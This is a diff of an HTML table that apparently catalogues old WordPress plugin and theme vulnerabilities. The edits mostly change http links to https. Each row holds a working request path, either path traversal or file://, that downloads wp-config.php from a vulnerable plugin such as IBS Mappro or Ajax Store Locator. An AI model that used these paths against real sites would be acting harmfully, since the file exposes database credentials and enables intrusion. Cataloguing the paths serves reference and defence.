@@ -107,7 +107,7 @@ and themes never load the WordPress core**.
         <td><abbr title="Arbitrary File Download">AFD</abbr></td>
         <td><span class="label label-danger">PD</span></td>
         <td>2015-07-09</td><!-- PD/NG https://wordpress.org/plugins/ibs-mappro/developers/ -->
-        <td class="left-align"><a href="http://www.securityfocus.com/bid/75698" title="WordPress IBS Mappro Plugin 'download.php' Arbitrary File Download Vulnerability">/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php</a></td>
+        <td class="left-align"><a href="https://www.securityfocus.com/bid/75698" title="WordPress IBS Mappro Plugin 'download.php' Arbitrary File Download Vulnerability">/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php</a></td>
       </tr>
       <tr><!-- 5 -->
         <td><abbr title="Remote File Download">RFD</abbr></td>
@@ -161,7 +161,7 @@ and themes never load the WordPress core**.
         <td><abbr title="Local File Disclosure">LFD</abbr></td>
         <td><span class="label label-warning">N/A</span></td>
         <td>2015-02-16</td><!-- N/A -->
-        <td class="left-align"><a href="http://milw00rm.org/exploits/7497" title="Wordpress Justified Image Grid 2.0.1 - Multiple (LFD/XSS) Vulnerabilities">/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php</a></td>
+        <td class="left-align"><a href="https://0day.today/exploit/23293" title="Wordpress Justified Image Grid 2.0.1 LFD / XSS Vulnerabilities - 0day.today Inj3ct0r Exploit Database : vulnerability : 0day : new exploits : buy and sell private exploit : shellcode by Inj3ct0r Team">/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php</a></td>
       </tr>
       <tr><!-- 14 -->
         <td><abbr title="Arbitrary File Download">AFD</abbr></td>
@@ -221,7 +221,7 @@ and themes never load the WordPress core**.
         <td><abbr title="Arbitrary File Download">AFD</abbr></td>
         <td><span class="label label-warning">N/A</span></td>
         <td>2014-12-06</td><!-- N/A -->
-        <td class="left-align"><a href="http://www.homelab.it/index.php/2014/12/06/wordpress-ajax-store-locator-arbitrary-file-download-vulnerability/" title="Wordpress Ajax Store Locator Arbitrary File Download Vulnerability">/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php</a></td>
+        <td class="left-align"><a href="https://www.homelab.it/index.php/2014/12/06/wordpress-ajax-store-locator-arbitrary-file-download-vulnerability/" title="Wordpress Ajax Store Locator Arbitrary File Download Vulnerability">/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php</a></td>
       </tr>
       <tr><!-- 24 -->
         <td><abbr title="Arbitrary File Download">AFD</abbr></td>
@@ -250,8 +250,8 @@ and themes never load the WordPress core**.
       <tr><!-- 28 -->
         <td><abbr title="Arbitrary File Download">AFD</abbr></td>
         <td><span class="label label-warning">N/A</span></td>
-        <td>2014-09-07</td><!-- N/A http://www.organizedthemes.com/themes/epic/ -->
-        <td class="left-align"><a href="http://cxsecurity.com/issue/WLB-2014090036" title="Wordpress epic theme Arbitrary File Download Vulnerability - CXSecurity.com">/wp-content/themes/epic/includes/download.php?file=wp-config.php</a></td>
+        <td>2014-09-07</td><!-- N/A https://www.organizedthemes.com/themes/epic/ -->
+        <td class="left-align"><a href="https://cxsecurity.com/issue/WLB-2014090036" title="Wordpress epic theme Arbitrary File Download Vulnerability - CXSecurity.com">/wp-content/themes/epic/includes/download.php?file=wp-config.php</a></td>
       </tr>
       <tr><!-- 29 -->
         <td><abbr title="Local File Inclusion">LFI</abbr></td>
@@ -280,7 +280,7 @@ and themes never load the WordPress core**.
       <tr><!-- 33 -->
         <td><abbr title="Remote File Disclosure">RFD</abbr></td>
         <td><span class="label label-warning">N/A</span></td>
-        <td>2011-09-19</td><!-- N/A http://plugins.svn.wordpress.org/filedownload/ -->
+        <td>2011-09-19</td><!-- N/A https://plugins.svn.wordpress.org/filedownload/ -->
         <td class="left-align"><a href="https://www.exploit-db.com/exploits/17858/" title="WordPress Filedownload Plugin 0.1 - download.php Remote File Disclosure Vulnerability - Exploits Database">/wp-content/plugins/filedownload/download.php?path=../../../wp-config.php&amp;type=aplication/pdf</a></td>
       </tr>
     </tbody>
